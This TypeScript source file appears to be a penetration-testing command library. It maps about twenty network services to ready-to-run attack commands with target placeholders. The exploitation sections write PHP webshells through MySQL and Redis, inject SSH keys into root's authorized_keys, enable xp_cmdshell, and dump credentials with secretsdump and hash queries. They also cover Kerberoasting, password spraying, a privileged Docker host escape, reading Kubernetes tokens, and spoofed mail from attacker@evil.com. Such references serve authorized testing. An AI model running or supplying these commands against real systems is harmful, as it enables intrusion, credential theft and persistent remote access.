/**
 * Service Enumeration and Exploitation Command Library
 * Professional penetration testing command repository for common services
 */

export interface ServiceCommand {
    id: string;
    description: string;
    command: string;
    tool: string;
}

export interface ServiceCategory {
    name: string;
    commands: ServiceCommand[];
}

export interface Service {
    id: string;
    name: string;
    defaultPorts: number[];
    description: string;
    categories: ServiceCategory[];
    requiresAuth?: boolean;
    requiresDomain?: boolean;
}

export const SERVICES: Service[] = [
    {
        id: 'ftp',
        name: 'FTP',
        defaultPorts: [21],
        description: 'File Transfer Protocol - Unencrypted file transfer service commonly misconfigured',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'ftp_nmap_enum',
                        description: 'Enumerate FTP server with Nmap scripts',
                        command: 'nmap -p {PORT} --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -sV {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'ftp_banner',
                        description: 'Grab FTP banner',
                        command: 'nc -nv {IP} {PORT}',
                        tool: 'netcat'
                    },
                    {
                        id: 'ftp_anon_check',
                        description: 'Check for anonymous login',
                        command: 'ftp {IP}',
                        tool: 'ftp'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'ftp_hydra',
                        description: 'Brute force FTP credentials',
                        command: 'hydra -L users.txt -P passwords.txt ftp://{IP}',
                        tool: 'hydra'
                    },
                    {
                        id: 'ftp_medusa',
                        description: 'Brute force with Medusa',
                        command: 'medusa -h {IP} -U users.txt -P passwords.txt -M ftp',
                        tool: 'medusa'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'ftp_download_all',
                        description: 'Download all accessible files',
                        command: 'wget -m ftp://{USER}:password@{IP}/',
                        tool: 'wget'
                    },
                    {
                        id: 'ftp_upload',
                        description: 'Upload file via FTP',
                        command: 'curl -T shell.php ftp://{IP} --user {USER}:password',
                        tool: 'curl'
                    }
                ]
            }
        ]
    },
    {
        id: 'ssh',
        name: 'SSH',
        defaultPorts: [22],
        description: 'Secure Shell - Encrypted remote access protocol, target for credential attacks',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'ssh_nmap',
                        description: 'Enumerate SSH service',
                        command: 'nmap -p {PORT} --script ssh-auth-methods,ssh-hostkey,ssh-publickey-acceptance {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'ssh_version',
                        description: 'Grab SSH banner',
                        command: 'nc {IP} {PORT}',
                        tool: 'netcat'
                    },
                    {
                        id: 'ssh_audit',
                        description: 'Audit SSH configuration',
                        command: 'ssh-audit {IP}',
                        tool: 'ssh-audit'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'ssh_hydra',
                        description: 'Brute force SSH credentials',
                        command: 'hydra -L users.txt -P passwords.txt ssh://{IP}',
                        tool: 'hydra'
                    },
                    {
                        id: 'ssh_key_auth',
                        description: 'Test SSH key authentication',
                        command: 'ssh -i id_rsa {USER}@{IP}',
                        tool: 'ssh'
                    },
                    {
                        id: 'ssh_user_enum',
                        description: 'Enumerate valid usernames',
                        command: 'python3 ssh-user-enum.py --userList users.txt {IP}',
                        tool: 'ssh-user-enum'
                    }
                ]
            },
            {
                name: 'Post-Exploitation',
                commands: [
                    {
                        id: 'ssh_tunnel',
                        description: 'Create SSH tunnel for port forwarding',
                        command: 'ssh -L 8080:localhost:80 {USER}@{IP}',
                        tool: 'ssh'
                    },
                    {
                        id: 'ssh_socks',
                        description: 'Create SOCKS proxy',
                        command: 'ssh -D 1080 {USER}@{IP}',
                        tool: 'ssh'
                    }
                ]
            }
        ]
    },
    {
        id: 'smtp',
        name: 'SMTP',
        defaultPorts: [25, 587, 465],
        description: 'Simple Mail Transfer Protocol - Email service often leaking user information',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'smtp_nmap',
                        description: 'Enumerate SMTP service',
                        command: 'nmap -p {PORT} --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-* {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'smtp_vrfy',
                        description: 'Verify email addresses with VRFY',
                        command: 'smtp-user-enum -M VRFY -U users.txt -t {IP}',
                        tool: 'smtp-user-enum'
                    },
                    {
                        id: 'smtp_rcpt',
                        description: 'Enumerate users with RCPT',
                        command: 'smtp-user-enum -M RCPT -U users.txt -t {IP}',
                        tool: 'smtp-user-enum'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'smtp_hydra',
                        description: 'Brute force SMTP credentials',
                        command: 'hydra -L users.txt -P passwords.txt {IP} smtp',
                        tool: 'hydra'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'smtp_relay',
                        description: 'Test for open relay',
                        command: 'nmap -p {PORT} --script smtp-open-relay {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'smtp_send',
                        description: 'Send email via SMTP',
                        command: 'swaks --to target@example.com --from attacker@evil.com --server {IP}:{PORT}',
                        tool: 'swaks'
                    }
                ]
            }
        ]
    },
    {
        id: 'dns',
        name: 'DNS',
        defaultPorts: [53],
        description: 'Domain Name System - Critical for reconnaissance and zone transfer attacks',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'dns_nmap',
                        description: 'Enumerate DNS service',
                        command: 'nmap -p {PORT} --script dns-nsid,dns-recursion,dns-service-discovery {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'dns_zone_transfer',
                        description: 'Attempt zone transfer',
                        command: 'dig axfr @{IP} {DOMAIN}',
                        tool: 'dig'
                    },
                    {
                        id: 'dns_reverse',
                        description: 'Reverse DNS lookup',
                        command: 'dig -x {IP} @{IP}',
                        tool: 'dig'
                    },
                    {
                        id: 'dns_enum',
                        description: 'Enumerate subdomains',
                        command: 'dnsenum --dnsserver {IP} -f subdomains.txt {DOMAIN}',
                        tool: 'dnsenum'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'dns_cache_snoop',
                        description: 'DNS cache snooping',
                        command: 'nmap -sU -p 53 --script dns-cache-snoop --script-args \'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={microsoft.com,google.com}\' {IP}',
                        tool: 'nmap'
                    }
                ]
            }
        ],
        requiresDomain: true
    },
    {
        id: 'smb',
        name: 'SMB',
        defaultPorts: [139, 445],
        description: 'Server Message Block - Windows file sharing, high-value target for lateral movement',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'smb_nmap',
                        description: 'Enumerate SMB with Nmap',
                        command: 'nmap -p {PORT} --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'smb_enum4linux',
                        description: 'Comprehensive SMB enumeration',
                        command: 'enum4linux -a {IP}',
                        tool: 'enum4linux'
                    },
                    {
                        id: 'smb_shares',
                        description: 'List SMB shares',
                        command: 'smbclient -L //{IP} -N',
                        tool: 'smbclient'
                    },
                    {
                        id: 'smb_crackmapexec',
                        description: 'Enumerate with CrackMapExec',
                        command: 'crackmapexec smb {IP} --shares',
                        tool: 'crackmapexec'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'smb_hydra',
                        description: 'Brute force SMB credentials',
                        command: 'hydra -L users.txt -P passwords.txt {IP} smb',
                        tool: 'hydra'
                    },
                    {
                        id: 'smb_cme_spray',
                        description: 'Password spraying with CrackMapExec',
                        command: 'crackmapexec smb {IP} -u users.txt -p \'Password123\'',
                        tool: 'crackmapexec'
                    },
                    {
                        id: 'smb_null_session',
                        description: 'Test null session',
                        command: 'rpcclient -U "" -N {IP}',
                        tool: 'rpcclient'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'smb_eternalblue',
                        description: 'Check for EternalBlue (MS17-010)',
                        command: 'nmap -p {PORT} --script smb-vuln-ms17-010 {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'smb_psexec',
                        description: 'Execute commands via PsExec',
                        command: 'impacket-psexec {DOMAIN}/{USER}:password@{IP}',
                        tool: 'impacket'
                    },
                    {
                        id: 'smb_smbexec',
                        description: 'Execute commands via SMBExec',
                        command: 'impacket-smbexec {DOMAIN}/{USER}:password@{IP}',
                        tool: 'impacket'
                    }
                ]
            },
            {
                name: 'Post-Exploitation',
                commands: [
                    {
                        id: 'smb_spider',
                        description: 'Spider SMB shares',
                        command: 'crackmapexec smb {IP} -u {USER} -p password --spider C$ --pattern txt',
                        tool: 'crackmapexec'
                    },
                    {
                        id: 'smb_secretsdump',
                        description: 'Dump credentials',
                        command: 'impacket-secretsdump {DOMAIN}/{USER}:password@{IP}',
                        tool: 'impacket'
                    }
                ]
            }
        ],
        requiresAuth: true,
        requiresDomain: true
    },
    {
        id: 'ldap',
        name: 'LDAP',
        defaultPorts: [389, 636],
        description: 'Lightweight Directory Access Protocol - Active Directory enumeration goldmine',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'ldap_nmap',
                        description: 'Enumerate LDAP service',
                        command: 'nmap -p {PORT} --script ldap-rootdse,ldap-search {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'ldap_search',
                        description: 'Anonymous LDAP search',
                        command: 'ldapsearch -x -H ldap://{IP} -b "DC={DOMAIN},DC=local"',
                        tool: 'ldapsearch'
                    },
                    {
                        id: 'ldap_users',
                        description: 'Enumerate users',
                        command: 'ldapsearch -x -H ldap://{IP} -b "DC={DOMAIN},DC=local" "(objectClass=user)"',
                        tool: 'ldapsearch'
                    },
                    {
                        id: 'ldap_dump',
                        description: 'Dump all LDAP information',
                        command: 'ldapdomaindump -u "{DOMAIN}\\{USER}" -p password {IP}',
                        tool: 'ldapdomaindump'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'ldap_auth',
                        description: 'Test LDAP authentication',
                        command: 'ldapsearch -x -H ldap://{IP} -D "{USER}@{DOMAIN}" -w password -b "DC={DOMAIN},DC=local"',
                        tool: 'ldapsearch'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'ldap_passback',
                        description: 'LDAP pass-back attack preparation',
                        command: 'nc -lvnp 389',
                        tool: 'netcat'
                    }
                ]
            }
        ],
        requiresAuth: true,
        requiresDomain: true
    },
    {
        id: 'kerberos',
        name: 'Kerberos',
        defaultPorts: [88],
        description: 'Windows authentication protocol - Target for AS-REP roasting and Kerberoasting',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'kerb_nmap',
                        description: 'Enumerate Kerberos service',
                        command: 'nmap -p {PORT} --script krb5-enum-users --script-args krb5-enum-users.realm="{DOMAIN}" {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'kerb_user_enum',
                        description: 'Enumerate valid usernames',
                        command: 'kerbrute userenum -d {DOMAIN} --dc {IP} users.txt',
                        tool: 'kerbrute'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'kerb_asrep',
                        description: 'AS-REP Roasting attack',
                        command: 'impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {IP} -format hashcat',
                        tool: 'impacket'
                    },
                    {
                        id: 'kerb_roast',
                        description: 'Kerberoasting attack',
                        command: 'impacket-GetUserSPNs {DOMAIN}/{USER}:password -dc-ip {IP} -request',
                        tool: 'impacket'
                    },
                    {
                        id: 'kerb_ticket',
                        description: 'Request TGT ticket',
                        command: 'impacket-getTGT {DOMAIN}/{USER}:password -dc-ip {IP}',
                        tool: 'impacket'
                    }
                ]
            }
        ],
        requiresAuth: true,
        requiresDomain: true
    },
    {
        id: 'nfs',
        name: 'NFS',
        defaultPorts: [2049],
        description: 'Network File System - Unix file sharing often misconfigured for privilege escalation',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'nfs_showmount',
                        description: 'List NFS shares',
                        command: 'showmount -e {IP}',
                        tool: 'showmount'
                    },
                    {
                        id: 'nfs_nmap',
                        description: 'Enumerate with Nmap',
                        command: 'nmap -p {PORT} --script nfs-ls,nfs-showmount,nfs-statfs {IP}',
                        tool: 'nmap'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'nfs_mount',
                        description: 'Mount NFS share',
                        command: 'mount -t nfs {IP}:/share /mnt/nfs',
                        tool: 'mount'
                    },
                    {
                        id: 'nfs_uid_exploit',
                        description: 'Create user with specific UID for privilege escalation',
                        command: 'useradd -u 1000 nfsuser && su nfsuser',
                        tool: 'useradd'
                    }
                ]
            }
        ]
    },
    {
        id: 'snmp',
        name: 'SNMP',
        defaultPorts: [161, 162],
        description: 'Simple Network Management Protocol - Information disclosure goldmine with weak community strings',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'snmp_nmap',
                        description: 'Enumerate SNMP service',
                        command: 'nmap -sU -p {PORT} --script snmp-info,snmp-netstat,snmp-processes {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'snmp_walk',
                        description: 'SNMP walk with public community',
                        command: 'snmpwalk -v 2c -c public {IP}',
                        tool: 'snmpwalk'
                    },
                    {
                        id: 'snmp_enum',
                        description: 'Comprehensive SNMP enumeration',
                        command: 'snmp-check {IP} -c public',
                        tool: 'snmp-check'
                    },
                    {
                        id: 'snmp_onesixtyone',
                        description: 'Brute force community strings',
                        command: 'onesixtyone -c community.txt {IP}',
                        tool: 'onesixtyone'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'snmp_users',
                        description: 'Extract user accounts',
                        command: 'snmpwalk -v 2c -c public {IP} 1.3.6.1.4.1.77.1.2.25',
                        tool: 'snmpwalk'
                    },
                    {
                        id: 'snmp_processes',
                        description: 'List running processes',
                        command: 'snmpwalk -v 2c -c public {IP} 1.3.6.1.2.1.25.4.2.1.2',
                        tool: 'snmpwalk'
                    }
                ]
            }
        ]
    },
    {
        id: 'mysql',
        name: 'MySQL',
        defaultPorts: [3306],
        description: 'Popular open-source database - Common target for credential attacks and SQL injection',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'mysql_nmap',
                        description: 'Enumerate MySQL service',
                        command: 'nmap -p {PORT} --script mysql-info,mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum {IP}',
                        tool: 'nmap'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'mysql_hydra',
                        description: 'Brute force MySQL credentials',
                        command: 'hydra -L users.txt -P passwords.txt {IP} mysql',
                        tool: 'hydra'
                    },
                    {
                        id: 'mysql_connect',
                        description: 'Connect to MySQL',
                        command: 'mysql -h {IP} -u {USER} -p',
                        tool: 'mysql'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'mysql_udf',
                        description: 'Upload UDF for command execution',
                        command: 'SELECT * FROM mysql.func WHERE name = \'sys_exec\';',
                        tool: 'mysql'
                    },
                    {
                        id: 'mysql_read_file',
                        description: 'Read local file via SQL',
                        command: 'SELECT LOAD_FILE(\'/etc/passwd\');',
                        tool: 'mysql'
                    },
                    {
                        id: 'mysql_write_file',
                        description: 'Write webshell to disk',
                        command: 'SELECT "<?php system($_GET[\'cmd\']); ?>" INTO OUTFILE \'/var/www/html/shell.php\';',
                        tool: 'mysql'
                    }
                ]
            }
        ],
        requiresAuth: true
    },
    {
        id: 'mssql',
        name: 'MSSQL',
        defaultPorts: [1433],
        description: 'Microsoft SQL Server - High-value target with command execution capabilities',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'mssql_nmap',
                        description: 'Enumerate MSSQL service',
                        command: 'nmap -p {PORT} --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password {IP}',
                        tool: 'nmap'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'mssql_hydra',
                        description: 'Brute force MSSQL credentials',
                        command: 'hydra -L users.txt -P passwords.txt {IP} mssql',
                        tool: 'hydra'
                    },
                    {
                        id: 'mssql_impacket',
                        description: 'Connect with Impacket',
                        command: 'impacket-mssqlclient {USER}:password@{IP} -windows-auth',
                        tool: 'impacket'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'mssql_xp_cmdshell',
                        description: 'Enable and execute xp_cmdshell',
                        command: 'EXEC sp_configure \'show advanced options\', 1; RECONFIGURE; EXEC sp_configure \'xp_cmdshell\', 1; RECONFIGURE; EXEC xp_cmdshell \'whoami\';',
                        tool: 'mssql'
                    },
                    {
                        id: 'mssql_hash_dump',
                        description: 'Dump password hashes',
                        command: 'impacket-mssqlclient {USER}:password@{IP} -windows-auth -query "SELECT name, password_hash FROM sys.sql_logins"',
                        tool: 'impacket'
                    },
                    {
                        id: 'mssql_linked_servers',
                        description: 'Enumerate linked servers',
                        command: 'EXEC sp_linkedservers;',
                        tool: 'mssql'
                    }
                ]
            }
        ],
        requiresAuth: true
    },
    {
        id: 'postgresql',
        name: 'PostgreSQL',
        defaultPorts: [5432],
        description: 'Advanced open-source database - Command execution via extensions and functions',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'postgres_nmap',
                        description: 'Enumerate PostgreSQL service',
                        command: 'nmap -p {PORT} --script pgsql-brute {IP}',
                        tool: 'nmap'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'postgres_hydra',
                        description: 'Brute force PostgreSQL credentials',
                        command: 'hydra -L users.txt -P passwords.txt {IP} postgres',
                        tool: 'hydra'
                    },
                    {
                        id: 'postgres_connect',
                        description: 'Connect to PostgreSQL',
                        command: 'psql -h {IP} -U {USER} -d postgres',
                        tool: 'psql'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'postgres_rce',
                        description: 'Command execution via COPY',
                        command: 'CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \'whoami\'; SELECT * FROM cmd_exec;',
                        tool: 'psql'
                    },
                    {
                        id: 'postgres_read_file',
                        description: 'Read local file',
                        command: 'CREATE TABLE temp(t TEXT); COPY temp FROM \'/etc/passwd\'; SELECT * FROM temp;',
                        tool: 'psql'
                    }
                ]
            }
        ],
        requiresAuth: true
    },
    {
        id: 'redis',
        name: 'Redis',
        defaultPorts: [6379],
        description: 'In-memory data store - Often exposed without authentication, RCE via module loading',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'redis_nmap',
                        description: 'Enumerate Redis service',
                        command: 'nmap -p {PORT} --script redis-info {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'redis_cli',
                        description: 'Connect to Redis',
                        command: 'redis-cli -h {IP} -p {PORT}',
                        tool: 'redis-cli'
                    },
                    {
                        id: 'redis_info',
                        description: 'Get server information',
                        command: 'redis-cli -h {IP} -p {PORT} INFO',
                        tool: 'redis-cli'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'redis_webshell',
                        description: 'Write webshell to disk',
                        command: 'redis-cli -h {IP} -p {PORT} config set dir /var/www/html && redis-cli -h {IP} -p {PORT} config set dbfilename shell.php && redis-cli -h {IP} -p {PORT} set test "<?php system($_GET[\'cmd\']); ?>" && redis-cli -h {IP} -p {PORT} save',
                        tool: 'redis-cli'
                    },
                    {
                        id: 'redis_ssh_key',
                        description: 'Write SSH key for access',
                        command: 'redis-cli -h {IP} -p {PORT} config set dir /root/.ssh && redis-cli -h {IP} -p {PORT} config set dbfilename authorized_keys && redis-cli -h {IP} -p {PORT} set ssh_key "ssh-rsa AAAA..." && redis-cli -h {IP} -p {PORT} save',
                        tool: 'redis-cli'
                    },
                    {
                        id: 'redis_rce_module',
                        description: 'Load malicious module for RCE',
                        command: 'redis-cli -h {IP} -p {PORT} MODULE LOAD /path/to/evil.so',
                        tool: 'redis-cli'
                    }
                ]
            }
        ]
    },
    {
        id: 'winrm',
        name: 'WinRM',
        defaultPorts: [5985, 5986],
        description: 'Windows Remote Management - PowerShell remoting for Windows administration',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'winrm_nmap',
                        description: 'Enumerate WinRM service',
                        command: 'nmap -p {PORT} --script http-iis-webdav-vuln,http-vuln-cve2017-12615 {IP}',
                        tool: 'nmap'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'winrm_cme',
                        description: 'Test credentials with CrackMapExec',
                        command: 'crackmapexec winrm {IP} -u {USER} -p password',
                        tool: 'crackmapexec'
                    },
                    {
                        id: 'winrm_evil',
                        description: 'Connect with Evil-WinRM',
                        command: 'evil-winrm -i {IP} -u {USER} -p password',
                        tool: 'evil-winrm'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'winrm_exec',
                        description: 'Execute commands remotely',
                        command: 'evil-winrm -i {IP} -u {USER} -p password -e /path/to/exes -s /path/to/scripts',
                        tool: 'evil-winrm'
                    }
                ]
            }
        ],
        requiresAuth: true
    },
    {
        id: 'rdp',
        name: 'RDP',
        defaultPorts: [3389],
        description: 'Remote Desktop Protocol - Windows remote access, target for BlueKeep and credential attacks',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'rdp_nmap',
                        description: 'Enumerate RDP service',
                        command: 'nmap -p {PORT} --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 {IP}',
                        tool: 'nmap'
                    }
                ]
            },
            {
                name: 'Authentication Testing',
                commands: [
                    {
                        id: 'rdp_hydra',
                        description: 'Brute force RDP credentials',
                        command: 'hydra -L users.txt -P passwords.txt rdp://{IP}',
                        tool: 'hydra'
                    },
                    {
                        id: 'rdp_cme',
                        description: 'Password spraying with CrackMapExec',
                        command: 'crackmapexec rdp {IP} -u users.txt -p password',
                        tool: 'crackmapexec'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'rdp_connect',
                        description: 'Connect via RDP',
                        command: 'xfreerdp /u:{USER} /p:password /v:{IP}',
                        tool: 'xfreerdp'
                    },
                    {
                        id: 'rdp_bluekeep',
                        description: 'Check for BlueKeep vulnerability',
                        command: 'nmap -p {PORT} --script rdp-vuln-ms12-020 {IP}',
                        tool: 'nmap'
                    }
                ]
            }
        ],
        requiresAuth: true
    },
    {
        id: 'http',
        name: 'HTTP',
        defaultPorts: [80, 8080, 8000],
        description: 'Hypertext Transfer Protocol - Web services, APIs, and web applications',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'http_nmap',
                        description: 'Enumerate HTTP service',
                        command: 'nmap -p {PORT} --script http-enum,http-headers,http-methods,http-robots.txt {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'http_nikto',
                        description: 'Scan with Nikto',
                        command: 'nikto -h {IP}:{PORT}',
                        tool: 'nikto'
                    },
                    {
                        id: 'http_gobuster',
                        description: 'Directory brute force',
                        command: 'gobuster dir -u http://{IP}:{PORT} -w /usr/share/wordlists/dirb/common.txt',
                        tool: 'gobuster'
                    },
                    {
                        id: 'http_feroxbuster',
                        description: 'Recursive directory fuzzing',
                        command: 'feroxbuster -u http://{IP}:{PORT} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
                        tool: 'feroxbuster'
                    },
                    {
                        id: 'http_whatweb',
                        description: 'Identify web technologies',
                        command: 'whatweb http://{IP}:{PORT}',
                        tool: 'whatweb'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'http_curl',
                        description: 'Make HTTP request',
                        command: 'curl -i http://{IP}:{PORT}',
                        tool: 'curl'
                    },
                    {
                        id: 'http_sqlmap',
                        description: 'SQL injection testing',
                        command: 'sqlmap -u "http://{IP}:{PORT}/page?id=1" --batch --dbs',
                        tool: 'sqlmap'
                    }
                ]
            }
        ]
    },
    {
        id: 'https',
        name: 'HTTPS',
        defaultPorts: [443, 8443],
        description: 'HTTP Secure - Encrypted web traffic, SSL/TLS certificate analysis',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'https_nmap',
                        description: 'Enumerate HTTPS service',
                        command: 'nmap -p {PORT} --script ssl-enum-ciphers,ssl-cert,ssl-known-key {IP}',
                        tool: 'nmap'
                    },
                    {
                        id: 'https_sslscan',
                        description: 'SSL/TLS vulnerability scan',
                        command: 'sslscan {IP}:{PORT}',
                        tool: 'sslscan'
                    },
                    {
                        id: 'https_testssl',
                        description: 'Comprehensive SSL/TLS testing',
                        command: 'testssl.sh {IP}:{PORT}',
                        tool: 'testssl.sh'
                    },
                    {
                        id: 'https_cert',
                        description: 'View SSL certificate',
                        command: 'openssl s_client -connect {IP}:{PORT} < /dev/null',
                        tool: 'openssl'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'https_heartbleed',
                        description: 'Test for Heartbleed',
                        command: 'nmap -p {PORT} --script ssl-heartbleed {IP}',
                        tool: 'nmap'
                    }
                ]
            }
        ]
    },
    {
        id: 'docker',
        name: 'Docker',
        defaultPorts: [2375, 2376],
        description: 'Docker API - Container platform, exposed API allows full system compromise',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'docker_version',
                        description: 'Check Docker version',
                        command: 'curl http://{IP}:{PORT}/version',
                        tool: 'curl'
                    },
                    {
                        id: 'docker_images',
                        description: 'List Docker images',
                        command: 'curl http://{IP}:{PORT}/images/json',
                        tool: 'curl'
                    },
                    {
                        id: 'docker_containers',
                        description: 'List running containers',
                        command: 'curl http://{IP}:{PORT}/containers/json',
                        tool: 'curl'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'docker_rce',
                        description: 'Create privileged container for RCE',
                        command: 'docker -H {IP}:{PORT} run -it --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host',
                        tool: 'docker'
                    },
                    {
                        id: 'docker_mount',
                        description: 'Mount host filesystem',
                        command: 'docker -H {IP}:{PORT} run -v /:/mnt -it alpine /bin/sh',
                        tool: 'docker'
                    }
                ]
            }
        ]
    },
    {
        id: 'elasticsearch',
        name: 'Elasticsearch',
        defaultPorts: [9200, 9300],
        description: 'Search and analytics engine - Often exposed without auth, information disclosure',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'elastic_info',
                        description: 'Get cluster information',
                        command: 'curl http://{IP}:{PORT}',
                        tool: 'curl'
                    },
                    {
                        id: 'elastic_indices',
                        description: 'List all indices',
                        command: 'curl http://{IP}:{PORT}/_cat/indices?v',
                        tool: 'curl'
                    },
                    {
                        id: 'elastic_search',
                        description: 'Search all documents',
                        command: 'curl http://{IP}:{PORT}/_search?pretty',
                        tool: 'curl'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'elastic_dump',
                        description: 'Dump specific index',
                        command: 'curl http://{IP}:{PORT}/index_name/_search?size=10000&pretty',
                        tool: 'curl'
                    }
                ]
            }
        ]
    },
    {
        id: 'kubernetes',
        name: 'Kubernetes',
        defaultPorts: [6443, 8001, 10250],
        description: 'Container orchestration platform - API server and kubelet exploitation',
        categories: [
            {
                name: 'Enumeration',
                commands: [
                    {
                        id: 'k8s_version',
                        description: 'Get Kubernetes version',
                        command: 'curl -k https://{IP}:{PORT}/version',
                        tool: 'curl'
                    },
                    {
                        id: 'k8s_pods',
                        description: 'List pods (if unauthenticated)',
                        command: 'curl -k https://{IP}:{PORT}/api/v1/pods',
                        tool: 'curl'
                    },
                    {
                        id: 'k8s_kubeletctl',
                        description: 'Enumerate kubelet',
                        command: 'kubeletctl -s {IP} pods',
                        tool: 'kubeletctl'
                    }
                ]
            },
            {
                name: 'Exploitation',
                commands: [
                    {
                        id: 'k8s_exec',
                        description: 'Execute command in pod via kubelet',
                        command: 'kubeletctl -s {IP} exec "whoami" -p pod_name -c container_name',
                        tool: 'kubeletctl'
                    },
                    {
                        id: 'k8s_token',
                        description: 'Read service account token',
                        command: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
                        tool: 'cat'
                    }
                ]
            }
        ]
    }
];

/**
 * Get service by ID
 */
export function getServiceById(id: string): Service | undefined {
    return SERVICES.find(service => service.id === id);
}

/**
 * Replace variables in command with actual values
 */
export function replaceCommandVariables(
    command: string,
    variables: { [key: string]: string }
): string {
    let result = command;
    // ES6-compatible iteration over object properties
    for (const key in variables) {
        if (variables.hasOwnProperty(key)) {
            const value = variables[key];
            const regex = new RegExp(`\\{${key}\\}`, 'g');
            result = result.replace(regex, value || `{${key}}`);
        }
    }
    return result;
}
